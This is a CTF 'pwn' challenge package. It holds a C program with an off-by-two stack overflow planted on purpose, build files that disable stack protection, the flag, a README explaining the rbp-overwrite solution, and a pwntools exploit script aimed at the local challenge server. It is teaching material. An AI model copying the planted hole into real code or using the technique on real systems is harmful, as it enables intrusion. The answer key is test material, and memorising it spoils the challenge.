{
    "Dockerfile": "FROM debian:buster-slim as build\n\nARG name\n\nRUN apt-get update -y; apt-get install build-essential -y\nADD $name.c /tmp/$name.c\nADD Makefile /tmp/Makefile\nRUN cd /tmp/; make all\n\nFROM debian:buster-slim\n\nARG name\nARG port\n\nRUN apt-get update -y; apt-get install socat -y\nCOPY --from=build /tmp/$name /pwn/$name\nCOPY flag.txt /pwn/flag.txt\nWORKDIR /pwn\n\nEXPOSE $port\n\nRUN echo \"exec socat -s TCP-LISTEN:$port,reuseaddr,fork EXEC:/pwn/$name,stderr\" > /pwn/docker_entrypoint.sh\n\nENTRYPOINT [\"sh\", \"/pwn/docker_entrypoint.sh\"]\n\n",
    "flag.txt": "gigem{small_overflows_are_still_effective}\n",
    "Makefile": "NAME := pointers\nPORT := 6969\nCFLAGS := -no-pie -fno-stack-protector\n\nall:\n\tgcc $(NAME).c -o $(NAME)\n\ndocker: Dockerfile $(NAME)\n\tdocker build -t $(NAME) --build-arg name=$(NAME) --build-arg port=$(PORT) .\n\nrun: docker\n\tdocker run -d --read-only --restart=always --name $(NAME) -p $(PORT):$(PORT) $(NAME)\n\nclean:\n\tdocker rm -f $(NAME)\n\tdocker rmi $(NAME)\n\trm $(NAME)\n\nextract: docker\n\t$(eval id := $(shell docker create $(NAME)))\n\tdocker cp $(id):/pwn/$(NAME) - | tar xv $(NAME)\n\tdocker rm -v $(id)\n\ndist: extract\n\tzip $(NAME).zip $(NAME) $(NAME).c\n",
    "pointers.c": "#include <stdio.h>\n#include <unistd.h>\n\nvoid upkeep() {\n    // Not related to the challenge, just some stuff so the remote works correctly\n    setvbuf(stdin, NULL, _IONBF, 0);\n    setvbuf(stdout, NULL, _IONBF, 0);\n    setvbuf(stderr, NULL, _IONBF, 0);\n}\n\nvoid win() {\n    char* argv[] = {\"/bin/cat\", \"flag.txt\", NULL};\n    execve(argv[0], argv, NULL);\n}\n\nvoid lose() {\n    char* argv[] = {\"/bin/echo\", \"loser\", NULL};\n    execve(argv[0], argv, NULL);\n}\n\nvoid vuln() {\n    char buf[010];\n    printf(\"Interaction pls: \");\n    read(0, buf, 10);\n}\n\nint main() {\n    upkeep();\n    void* func_ptrs[] = {lose, win};\n    printf(\"All my functions are being stored at %p\\n\", func_ptrs);\n    \n    vuln();\n    \n    void (*poggers)() = func_ptrs[0];\n    poggers();\n}\n",
    "README.md": "# Pointers\n\nAuthor: `anomie`\n\nI've been messing with pointers lately which never goes wrong, right?\n\n## Dev Notes\nHost the remote with `make run`, it is running by default on port 6969.\n\nSource code (`pointer.c`) and binary are provided to the competitors. Copy the binary down from the docker with\n```\ndocker cp pointers:/pwn/pointers .\n```\n\n## Solution\nLooking at the source, there's a 2-byte overflow because `010` is 8 in octal notation, but `read()` takes in 10 bytes. Some dynamic analysis will reveal that we can use this to overwrite the lower 2 bytes of `rbp`. Examining the disassembly after the call to `vuln()`, we see that the function pointer is loaded from `rbp - 0x20`:\n\n``` \n0x4012b1 <main+74>        mov    rax, QWORD PTR [rbp-0x20]\n0x4012b5 <main+78>        mov    QWORD PTR [rbp-0x8], rax\n0x4012b9 <main+82>        mov    rdx, QWORD PTR [rbp-0x8]\n0x4012bd <main+86>        mov    eax, 0x0\n0x4012c2 <main+91>        call   rdx\n```\n\nOur goal is to call `win()`, which is stored at 8 bytes beyond the leaked address. Thus, we need to have `rbp - 0x20 == leak + 8`, so we want to overwrite `rbp` with `leak + 40`. Luckily for us, the upper 6 bytes are already the same, so we just need to send 8 bytes of padding, followed by the target address. See `solve.py` for the full solution.\n\nFlag: `gigem{small_overflows_are_still_effective}`\n",
    "solve.py": "from pwn import *\n\ncontext.arch = \"amd64\"\n\np = remote(\"localhost\", 6969)\nleak = p.recvline().decode().split(\"0x\")[1].strip()\ntarget = int(leak, 16) + 40\np.sendline(b\"A\" * 8 + p64(target))\nprint(p.clean())\n",
    "category": "pwn"
}